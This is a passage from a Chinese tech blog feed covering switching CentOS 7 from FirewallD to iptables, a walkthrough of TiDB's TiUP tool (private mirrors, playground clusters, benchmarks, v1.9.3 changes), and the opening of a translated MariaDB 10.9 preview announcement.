<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo systemctl mask --now firewalld</span></span><br></pre></td></tr></table></figure></div>
<h2 id="安装并启用Iptables">安装并启用Iptables</h2>
<p>在CentOS 7系统中，安装Iptables的方法如下:</p>
<ol>
<li>运行以下命令，安装CentOS存储库中的 <code>iptables-service</code> 包：</li>
</ol>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo yum install iptables-services</span></span><br></pre></td></tr></table></figure></div>
<ol start="2">
<li>安装完成后，启动Iptables服务:</li>
</ol>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo systemctl start iptables</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo systemctl start ip6tables</span></span><br></pre></td></tr></table></figure></div>
<ol start="3">
<li>启用Iptables服务，使其在系统启动时自动启动：</li>
</ol>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo systemctl <span class="built_in">enable</span> iptables</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo systemctl <span class="built_in">enable</span> ip6tables</span></span><br></pre></td></tr></table></figure></div>
<ol start="4">
<li>用下面的命令检查Iptables服务：</li>
</ol>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo systemctl status iptables</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo systemctl status ip6tables</span></span><br></pre></td></tr></table></figure></div>
<ol start="5">
<li>使用下面的命令，检查当前iptables规则：</li>
</ol>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo iptables -nvL</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo ip6tables -nvL</span></span><br></pre></td></tr></table></figure></div>
<p>默认情况下，只有SSH端口22是开放的，输出应该如下：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">Chain INPUT (policy ACCEPT 0 packets, 0 bytes)</span><br><span class="line"> pkts bytes target prot opt in out source destination</span><br><span class="line"> 5400 6736K ACCEPT all -- * * 0.0.0.0/0 0.0.0.0/0 state RELATED,ESTABLISHED</span><br><span class="line"> 0 0 ACCEPT icmp -- * * 0.0.0.0/0 0.0.0.0/0</span><br><span class="line"> 2 148 ACCEPT all -- lo * 0.0.0.0/0 0.0.0.0/0</span><br><span class="line"> 3 180 ACCEPT tcp -- * * 0.0.0.0/0 0.0.0.0/0 state NEW tcp dpt:22</span><br><span class="line"> 0 0 REJECT all -- * * 0.0.0.0/0 0.0.0.0/0 reject-with icmp-host-prohibited</span><br><span class="line"></span><br><span class="line">Chain FORWARD (policy ACCEPT 0 packets, 0 bytes)</span><br><span class="line"> pkts bytes target prot opt in out source destination</span><br><span class="line"> 0 0 REJECT all -- * * 0.0.0.0/0 0.0.0.0/0 reject-with icmp-host-prohibited</span><br><span class="line"></span><br><span class="line">Chain OUTPUT (policy ACCEPT 4298 packets, 295K bytes)</span><br><span class="line"> pkts bytes target prot opt in out source destination</span><br></pre></td></tr></table></figure></div>
<p>至此，您已经成功地启用了iptables服务，您可以构建您的防火墙了。这些变更将在机器重启后持续存在。</p>
<h2 id="结论">结论</h2>
<p>在本教程中，您学习了如何禁用FirewallD服务和安装iptables。</p>
<p>如果您有任何问题或评论，请在下方留言。</p>
<hr>
<h2 id="译者注：">译者注：</h2>
<p>这两个服务确实不常用，有兴趣的墨友可以试试看：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[shawnyan@centos7 ~]$ systemctl status iptables.service</span><br><span class="line">● iptables.service - IPv4 firewall with iptables</span><br><span class="line">   Loaded: loaded (/usr/lib/systemd/system/iptables.service; disabled; vendor preset: disabled)</span><br><span class="line">   Active: inactive (dead) since Tue 2022-03-29 15:10:21 JST; 20h ago</span><br><span class="line">  Process: 76583 ExecStop=/usr/libexec/iptables/iptables.init stop (code=exited, status=0/SUCCESS)</span><br><span class="line">  Process: 76560 ExecStart=/usr/libexec/iptables/iptables.init start (code=exited, status=0/SUCCESS)</span><br><span class="line"> Main PID: 76560 (code=exited, status=0/SUCCESS)</span><br><span class="line"></span><br><span class="line">[shawnyan@centos7 ~]$ systemctl status ip6tables.service</span><br><span class="line">● ip6tables.service - IPv6 firewall with ip6tables</span><br><span class="line">   Loaded: loaded (/usr/lib/systemd/system/ip6tables.service; disabled; vendor preset: disabled)</span><br><span class="line">   Active: inactive (dead)</span><br></pre></td></tr></table></figure></div>
<hr>
<p><a class="link"   href="https://www.modb.pro/db/387746" >https://www.modb.pro/db/387746 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>Red Hat</category>
        <category>CentOS</category>
      </categories>
      <tags>
        <tag>redhat</tag>
        <tag>centos</tag>
        <tag>iptables</tag>
        <tag>firewalld</tag>
        <tag>译文</tag>
      </tags>
  </entry>
  <entry>
    <title>TiUP: TiDBAer 必备利器</title>
    <url>/2022/tidb/tiup-intro/</url>
    <content><![CDATA[<p>对于企业级和云数据库，除了性能、可用性和功能等常规维度外，一个重要维度就是可管理性，可管理性维度会很深地影响用户实际使用数据库的隐性成本。在 TiDB 的 <a class="link"   href="https://pingcap.com/zh/blog/tidb-6.0-release" >最新版本 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 中，TiDB 引入了数据放置框架（Placement Rules In SQL），增加了企业级集群管理组件 TiDB Enterprise Manager，开放了智能诊断服务 PingCAP Clinic 的预览，大幅度加强了作为企业级产品的可管理性，与此同时也加入了诸多云原生数据库所需的基础设施。</p>
<p>温故而知新，本文主要介绍构成 TiDB 可管理性的重要组件之一：TiUP，一款从 TiDB 4.0 版本开始投入使用的 TiDB 部署工具。 TiUP 对于 TiDBer 来说是日常必备工具，如果您刚接触 TiDB，请先参阅这篇文章： <a class="link"   href="https://pingcap.com/zh/blog/tiup-introduction" >《从马车到电动车，TiDB 部署工具变形记》 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 。</p>
<h2 id="环境说明">环境说明</h2>
<p>本文所涉及到的环境、组件版本信息如下：</p>
<blockquote>
<p>TiDB v5.4.0</p>
<p>TiUP v1.9.3 (2022-03-24 Release)</p>
<p>CentOS 7.9</p>
</blockquote>
<h2 id="TiUP简介">TiUP简介</h2>
<p>在各种系统软件和应用软件的安装管理中，包管理器均有着广泛的应用，包管理工具的出现大大简化了软件的安装和升级维护工作。例如，几乎所有使用 RPM 的 Linux 都会使用 Yum 来进行包管理，而 Anaconda 则可以非常方便地管理 python 的环境和相关软件包。</p>
<p>从 TiDB 4.0 版本开始，TiUP 作为新的工具，承担着包管理器的角色，管理着 TiDB 生态下众多的组件，如 TiDB、PD、TiKV 等。用户想要运行 TiDB 生态中任何组件时，只需要执行 TiUP 一行命令即可，相比以前，极大地降低了管理难度。</p>
<img  alt="1.jpg" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://tidb-blog.oss-cn-beijing.aliyuncs.com/media/1-1648194422640.jpg"
                      referrerpolicy="no-referrer"
                >
<p>图1 - <a class="link"   href="https://github.com/pingcap/tiup/graphs/contributors" >tiup源码contributors <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<img  alt="2.jpg" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://tidb-blog.oss-cn-beijing.aliyuncs.com/media/2-1648194432637.jpg"
                      referrerpolicy="no-referrer"
                >
<p>图2 - tiup 源码行数统计(2022-03-24)</p>
<p>TiUP 已发布两年有余，版本迭代若干次，代码总量翻倍，由上图可以看出代码更新已放缓，TiDBer 可放心地在生产环境使用。</p>
<h2 id="再论TiUP组件">再论TiUP组件</h2>
<p>作为Ti利器，TiUP 可是日常工作必备。下面再来讨论下TiUP的经典组件和常用命令。先将 tiup 重要命令列举如下，然后再着重讨论。</p>
<ul>
<li>
<p>tiup</p>
<ul>
<li>main/cmd/root
<ul>
<li>
<p>tiup env</p>
</li>
<li>
<p><strong>tiup status</strong></p>
</li>
<li>
<p>tiup mirror</p>
</li>
<li>
<p>tiup list --all --verbose</p>
</li>
<li>
<p>tiup install hello</p>
</li>
<li>
<p>tiup update</p>
</li>
<li>
<p><strong>tiup playground</strong></p>
</li>
<li>
<p>tiup client</p>
</li>
<li>
<p><strong>tiup cluster</strong></p>
</li>
<li>
<p><strong>tiup bench</strong> <strong>ch</strong>(CH-benCHmark)/<strong>TPCC</strong>(TPC-C)/<strong>TPCH</strong>(TPC-H)/<strong>YCSB</strong>(Yahoo! Cloud Serving Benchmark)</p>
</li>
<li>
<p>tiup dm</p>
</li>
<li>
<p>tiup clean</p>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="tiup-mirror">tiup mirror</h3>
<p>不是每个公司都会把数据库部在公有云上的，即便是在公有云，为了便于版本统一管理，大都会选择自建一个仓库，是为生产库基准版本管理。而对于金融业务更不用多说，那么，如何在内网快速、简洁、有效地搭建和维护仓库，下面做个简单的示例。</p>
<p>首先需要在能连接外网的机器安装tiup，并克隆官方tiup仓库：</p>
<ul>
<li>下载tiup文件，并添加环境变量</li>
</ul>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir -pv ~/.tiup/bin</span><br><span class="line">wget https://tiup-mirrors.pingcap.com/tiup-linux-amd64.tar.gz</span><br><span class="line">tar zxf tiup-linux-amd64.tar.gz -C ~/.tiup/bin/</span><br><span class="line">echo &#x27;export PATH=~/.tiup/bin:$PATH&#x27; &gt;&gt; ~/.bash_profile</span><br><span class="line">source ~/.bash_profile</span><br><span class="line">tiup -v</span><br></pre></td></tr></table></figure></div>
<p>输出的tiup版本信息：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.9.3 tiup</span><br><span class="line">Go Version: go1.17.7</span><br><span class="line">Git Ref: v1.9.3</span><br><span class="line">GitHash: f523cd5e051d0001e25d5a8b2c0d5d3ff058a5d5</span><br></pre></td></tr></table></figure></div>
<ul>
<li>克隆官方库</li>
</ul>
<p>先将仓库镜像指向官方库：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">tiup mirror set https://tiup-mirrors.pingcap.com</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">屏幕输出日志&gt; Successfully <span class="built_in">set</span> mirror to https://tiup-mirrors.pingcap.com</span></span><br></pre></td></tr></table></figure></div>
<p>只克隆适合当前操作系统的最新版本，这里只需指定 <code>TiDB v5.4.0</code> 版本，其他组件会自动识别最新版本，并下载。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">tiup mirror clone ~/.tiup/package -a amd64 -o linux v5.4.0</span><br></pre></td></tr></table></figure></div>
<ul>
<li>将package文件夹打包复制到内网机器：</li>
</ul>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">current server</span></span><br><span class="line">tar zcf package.tgz package/</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">new server</span></span><br><span class="line">cd ~/.tiup</span><br><span class="line">tar zxvf package.tgz</span><br><span class="line">./package/local_install.sh</span><br><span class="line">source ~/.bash_profile</span><br><span class="line">tiup list</span><br></pre></td></tr></table></figure></div>
<p>此时，新的本地仓已建好，创建一个<code>hello</code>组件进行测试：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">test</span> mirror</span></span><br><span class="line">CMP_TMP_DIR=`mktemp -d -p ~/.tiup`</span><br><span class="line">cat &gt; $CMP_TMP_DIR/hello.sh &lt;&lt; EOF</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">! /bin/sh</span></span><br><span class="line">echo -e &quot;\033[0;36m&lt;&lt;&lt; Hello, TiDB! &gt;&gt;&gt;\033[0m&quot;</span><br><span class="line">EOF</span><br><span class="line">chmod 755 $CMP_TMP_DIR/hello.sh</span><br><span class="line">tar -C $CMP_TMP_DIR -czf $CMP_TMP_DIR/hello.tar.gz hello.sh</span><br></pre></td></tr></table></figure></div>
<ul>
<li>将<code>hello</code>组件发布到本地仓：</li>
</ul>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">tiup mirror genkey</span><br><span class="line">tiup mirror grant admin</span><br><span class="line">tiup mirror publish hello v0.0.1 $CMP_TMP_DIR/hello.tar.gz hello.sh --desc &#x27;Hello, TiDB&#x27;</span><br></pre></td></tr></table></figure></div>
<p>查看已发布的组件，并运行组件：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">tiup list hello</span><br><span class="line">tiup hello</span><br></pre></td></tr></table></figure></div>
<img  alt="3.jpg" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://tidb-blog.oss-cn-beijing.aliyuncs.com/media/3-1648194530413.jpg"
                      referrerpolicy="no-referrer"
                >
<p>图3-hello组件运行输出</p>
<p>此时的本地仓以可以管理自发布组件，但仍无法对外提供服务，下面用<code>tiup server</code>一键搭建私有库：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">运行tiup server</span></span><br><span class="line">tiup server ~/.tiup/package --addr 0.0.0.0:8000 --upstream=&quot;&quot;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">修改镜像指向</span></span><br><span class="line">tiup mirror set &#x27;http://127.0.0.1:8000&#x27;</span><br></pre></td></tr></table></figure></div>
<p>注：由于版本差异，当前版本已不建议使用环境变量<code>TIUP_MIRRORS</code>，而是建议使用命令<code>tiup mirror set &lt;mirror-addr&gt;</code>。</p>
<h3 id="tiup-playground">tiup playground</h3>
<p>对于分布式数据库来说，如何在本地快速搭建原型，以进行基本功能验证、测试，这是作为DBA的基本能力。于是，<code>tiup playground</code>应运而生，一键搭建最小可用集群，并可以指定初始TiDB每个组件启动的个数，以及扩缩容。</p>
<p>例如，启动一个标签为<code>mydb1</code>的集群，包含一个TiDB实例，一个TiKV实例，一个PD实例，一个TiFlash实例，不启动监控组件：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ tiup playground v5.4.0 --host 127.0.0.1 --tag mydb1 --db 1 --kv 1 --pd 1 --tiflash 1 --without-monitor</span><br><span class="line">127.0.0.1:4000 ... Done</span><br><span class="line">127.0.0.1:3930 ... Done</span><br><span class="line">CLUSTER START SUCCESSFULLY, Enjoy it ^-^</span><br><span class="line">To connect TiDB: mysql --comments --host 127.0.0.1 --port 4000 -u root -p (no password)</span><br><span class="line">To view the dashboard: http://127.0.0.1:2379/dashboard</span><br><span class="line">PD client endpoints: [127.0.0.1:2379]</span><br></pre></td></tr></table></figure></div>
<p>查看各组件进程id:</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ tiup playground display</span><br><span class="line">Pid   Role     Uptime</span><br><span class="line">---   ----     ------</span><br><span class="line">4321  pd       10m39.092616075s</span><br><span class="line">4322  tikv     10m39.087748551s</span><br><span class="line">4353  tidb     10m37.765844216s</span><br><span class="line">4527  tiflash  9m50.16054123s</span><br></pre></td></tr></table></figure></div>
<p>连接tidb server，并查询版本：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ mysql -uroot -h127.1 -P4000 -e &#x27;select version()\G&#x27;</span><br><span class="line">*************************** 1. row ***************************</span><br><span class="line">version(): 5.7.25-TiDB-v5.4.0</span><br></pre></td></tr></table></figure></div>
<p>再例如，启动一个标签为<code>mydb2</code>的集群，只启动TiKV实例，和3个PD实例：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ tiup playground v5.4.0 --host 127.0.0.1 --tag mydb2 --mode tikv-slim --pd 3 --without-monitor</span><br><span class="line">Playground Bootstrapping...</span><br><span class="line">Start pd instance:v5.4.0</span><br><span class="line">Start pd instance:v5.4.0</span><br><span class="line">Start pd instance:v5.4.0</span><br><span class="line">Start tikv instance:v5.4.0</span><br><span class="line">PD client endpoints: [127.0.0.1:2379 127.0.0.1:2382 127.0.0.1:2384]</span><br></pre></td></tr></table></figure></div>
<p>通过PD API查看当前PD有几个成员，以及TiKV实例信息：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ curl -s http://127.0.0.1:2379/pd/api/v1/members | jq .members[].name</span><br><span class="line">&quot;pd-1&quot;</span><br><span class="line">&quot;pd-0&quot;</span><br><span class="line">&quot;pd-2&quot;</span><br><span class="line"></span><br><span class="line">$ curl -s http://127.0.0.1:2379/pd/api/v1/stores | jq .stores[].store</span><br><span class="line">&#123;</span><br><span class="line">  &quot;id&quot;: 1,</span><br><span class="line">  &quot;address&quot;: &quot;127.0.0.1:20160&quot;,</span><br><span class="line">  &quot;version&quot;: &quot;5.4.0&quot;,</span><br><span class="line">  &quot;status_address&quot;: &quot;127.0.0.1:20180&quot;,</span><br><span class="line">  &quot;git_hash&quot;: &quot;b5262299604df88711d9ed4b84d43e9c507749a2&quot;,</span><br><span class="line">  &quot;start_timestamp&quot;: 1648110516,</span><br><span class="line">  &quot;deploy_path&quot;: &quot;/data/tiup/components/tikv/v5.4.0&quot;,</span><br><span class="line">  &quot;last_heartbeat&quot;: 1648112496884914000,</span><br><span class="line">  &quot;state_name&quot;: &quot;Up&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h3 id="Misc">Misc</h3>
<p>性能测试也是必要环节，所以看到tiup已经集成了tpcc,tpch,ycsh,ch四种测试工具集。可通过下面命令进行一键测试。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">tiup bench ch/tpcc/tpch/ycsb</span><br></pre></td></tr></table></figure></div>
<p>一键清理数据的命令如下：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">tiup clean --all</span><br></pre></td></tr></table></figure></div>
<p>这里需要强调的是，在生产环境需要慎重执行下面的指令，除非你知道你在做什么：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">tiup cluster clean mydb3 --all</span><br><span class="line">tiup cluster destroy mydb3</span><br><span class="line">tiup cluster prune mydb3</span><br></pre></td></tr></table></figure></div>
<img  alt="4.jpg" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://tidb-blog.oss-cn-beijing.aliyuncs.com/media/4-1648194507775.jpg"
                      referrerpolicy="no-referrer"
                >
<p>图4-查看所有可用组件</p>
<p>其他组件另行讨论，或请先参阅官方文档。</p>
<h2 id="TiUP-v1-9-3-Release">TiUP v1.9.3 Release</h2>
<p>2022-03-24，TiUP发布了v1.9.3版本，从变更日志中我们可以清晰地了解到，本次更新修复了5个bug，做了2点改进。</p>
<blockquote>
<p>修复：</p>
</blockquote>
<ul>
<li>修复了主机名存在<code>-</code>时，<code>tiup-cluster</code>的<code>exec</code>子命令无法使用的错误。 (<a class="link"   href="https://github.com/pingcap/tiup/pull/1794" >#1794 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>, <a class="link"   href="https://github.com/nexustar" >@nexustar <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>)</li>
<li>修复了使用<code>tiup-cluster</code>命令时，TiFlash实例的端口（服务端口、代理端口、代理状态端口）冲突检测问题。 (<a class="link"   href="https://github.com/pingcap/tiup/pull/1805" >#1805 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>, <a class="link"   href="https://github.com/AstroProfundis" >@AstroProfundis <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>)</li>
<li>修复了下一代监控(<code>ng-monitor</code>)在Prometheus不可用的问题。 (<a class="link"   href="https://github.com/pingcap/tiup/pull/1806" >#1806 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>, <a class="link"   href="https://github.com/nexustar" >@nexustar <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>)</li>
<li>修复了在主机只部署Prometheus的情况下，node_exporter度量指标无法收集的问题。（与上个问题一同修复。） (<a class="link"   href="https://github.com/pingcap/tiup/pull/1806" >#1806 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>, <a class="link"   href="https://github.com/nexustar" >@nexustar <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>)</li>
<li>修复了<code>tiup-playground</code>在指定<code>--host 0.0.0.0</code>时，无法工作的问题。 (<a class="link"   href="https://github.com/pingcap/tiup/pull/1811" >#1811 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>, <a class="link"   href="https://github.com/nexustar" >@nexustar <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>)</li>
</ul>
<blockquote>
<p>改进：</p>
</blockquote>
<ul>
<li>支持<code>tiup-cluster</code>和<code>tiup-dm</code>命令清理审计日志。(<a class="link"   href="https://github.com/pingcap/tiup/pull/1780" >#1780 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>, <a class="link"   href="https://github.com/srstack" >@srstack <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>)</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">tiup cluster audit cleanup</span><br><span class="line">tiup dm audit cleanup</span><br></pre></td></tr></table></figure></div>
<ul>
<li>在Grafana配置模板中增加匿名登陆示例。（这里需要确保DM组件版本在v1.9.0之上 =&gt; <code>tiup dm -v</code>） (<a class="link"   href="https://github.com/pingcap/tiup/pull/1785" >#1785 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><a class="link"   href="https://github.com/sunzhaoyang" >@sunzhaoyang <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>)</li>
</ul>
<h2 id="引申思考">引申思考</h2>
<p>云数据库时代，或者说分布式数据库时代下，DBA角色该如何进行自我调整？我们是否还需要一个只会某种数据库运维的DBA，比如只会db2、oracle、mysql、postgresql等传统关系型数据库，或者进阶的将，是否需要懂业务，有开发功底的业务型DBA。其实，现在这些都没有过时，且不应该被抛弃，而应该作为基础功，变成DBA知识结构的底层模块，DBA需要以此为基，向更高阶段进化，犹如诸位前辈经历那般，写得了数据库源码，懂得前端客户真正所需，才能开发、调校出适合业务场景的高效能数据库，以及一套好上手、易管理的数据库生态工具。</p>
<p>毋庸置疑，tiup就是符合这种特质的工具。一键搭建私有库，一键运行最小集群，一键管理整个TiDB集群，并可对TiDB集群进行一键扩、缩容。不过，看似简单的背后也是有功能取舍的，比如，<code>tiup mirror</code>只能是在命令行进行操作，而没有类似Nexus这种可在浏览器进行发布、删除包的界面工具。又如，tiup最常用的场景还是运行在普通机器上，对于k8s环境有<code>TiDB Operator</code>工具，但是对于批量操作ECS的功能或案例，还是很少的。总之，希望tiup在保持实用的前提下，功能更强劲。</p>
<h2 id="参考链接">参考链接</h2>
<ul>
<li><a class="link"   href="https://tiup.io/" >tiup.io <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://docs.pingcap.com/zh/tidb/stable/check-before-deployment#%E6%89%8B%E5%8A%A8%E9%85%8D%E7%BD%AE-ssh-%E4%BA%92%E4%BF%A1%E5%8F%8A-sudo-%E5%85%8D%E5%AF%86%E7%A0%81" >手动配置-ssh-互信及-sudo-免密码 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://docs.pingcap.com/zh/tidb/stable/production-deployment-using-tiup" >使用 TiUP 部署 TiDB 集群 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://tidb.io/blog/694da37a" >TiUP cluster 用到的三个账户 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ul>
<hr>
<p><a class="link"   href="https://www.modb.pro/db/383528" >https://www.modb.pro/db/383528 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>
<a class="link"   href="https://tidb.net/blog/a0d37d88?shareId=9ff4a1f7" >https://tidb.net/blog/a0d37d88?shareId=9ff4a1f7 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>
<a class="link"   href="https://mp.weixin.qq.com/s/k742U5qbdBL_EJ51GcHgBg" >https://mp.weixin.qq.com/s/k742U5qbdBL_EJ51GcHgBg <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>TiDB</category>
        <category>TiDB 5.x</category>
      </categories>
      <tags>
        <tag>tidb</tag>
        <tag>pingcap</tag>
        <tag>tiup</tag>
        <tag>golang</tag>
        <tag>ansible</tag>
      </tags>
  </entry>
  <entry>
    <title>[译] MariaDB 10.9 预览版发布</title>
    <url>/2022/mariadb/fanyi-mariadb-10-9-preview-releases-now-available/</url>
    <content><![CDATA[<blockquote>
<p>原文链接：<a class="link"   href="https://mariadb.org/mariadb-10-9-preview-releases-now-available/" >https://mariadb.org/mariadb-10-9-preview-releases-now-available/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>
原文作者：Ian Gilfillan</p>
</blockquote>
<p>我们很高兴的宣布，在 <a class="link"   href="https://mariadb.org/new-innovation-release-model/" >新发版模型 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 下，MariaDB第三代系列–MariaDB 10.9.0发布。</p>
<h2 id="MariaDB成熟地更快">MariaDB成熟地更快</h2>
<p>新模型的目标之一，是将特性更快的交付给用户，在新特性更容易的被测试、同时开发多个新特性的情况下，保证稳定性。</p>
<h2 id="MariaDB-10-9-的候选功能">MariaDB 10.9 的候选功能</h2>
<p>有四个不同的预览版本，分别包含下面的特性，并考虑在10.9.1发布：</p>
<h3 id="SHOW-ANALYZE-FORMAT-JSON">SHOW ANALYZE FORMAT=JSON</h3>
<ol>
<li>扩展 <code>SHOW EXPLAIN</code> 命令，以支持 <code>SHOW ANALYZE [FORMAT=JSON]</code> (<a class="link"   href="https://jira.mariadb.org/browse/MDEV-27021" >MDEV-27021 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>)</li>
<li>增加 <code>EXPLAIN FOR CONNECTION</code> 语法，以支持 <code>SHOW EXPLAIN</code> (<a class="link"   href="https://jira.mariadb.org/browse/MDEV-10000" >MDEV-10000 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>)</li>
</ol>
<h3 id="JSON-Range-表达式">JSON Range 表达式</h3>
<ol>
<li>为JSON Path实现Range表达式 (<a class="link"   href="https://jira.mariadb.org/browse/MDEV-27911" >MDEV-27911 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>)</li>
<li>支持JSON Path负索引 (<a class="link"   href="https://jira.mariadb.org/browse/MDEV-22224" >MDEV-22224 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>)</li>
<li><code>JSON_OVERLAPS</code>方法 (<a class="link"   href="https://jira.mariadb.org/browse/MDEV-27677" >MDEV-27677 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>)</li>
</ol>
<h3 id="重做日志异步写">重做日志异步写</h3>
<ol>
<li>重做日志异步写(<a class="link"   href="https://jira.mariadb.org/browse/MDEV-26603" >MDEV-26603 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>)</li>
</ol>
<h3 id="其他项">其他项</h3>
<ol>
<li>实现 mysqlbinlog的 <code>–-do-domain-ids, –-ignore-domain-ids, –-ignore-server-ids</code> 选项(<a class="link"   href="https://jira.mariadb.org/browse/MDEV-20119" >MDEV-20119 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>)</li>
<li><code>information_schema.tables.table_type</code> 现在将本地临时表显示为<code>TEMPORARY</code> (<a class="link"   href="https://jira.mariadb.org/browse/MDEV-12459" >MDEV-12459 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>)</li>
<li>合并“old”SQL变量到“old_mode” (<a class="link"   href="https://jira.mariadb.org/browse/MDEV-24920" >MDEV-24920 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>)</li>
<li>保险密钥管理插件 (<a class="link"   href="https://jira.mariadb.org/browse/MDEV-19281" >MDEV-19281 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>)</li>
<li>wsrep解决状态，SST进程日志的JSON文件接口 (<a class="link"   href="https://jira.mariadb.org/browse/MDEV-26971" >MDEV-26971 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>)</li>
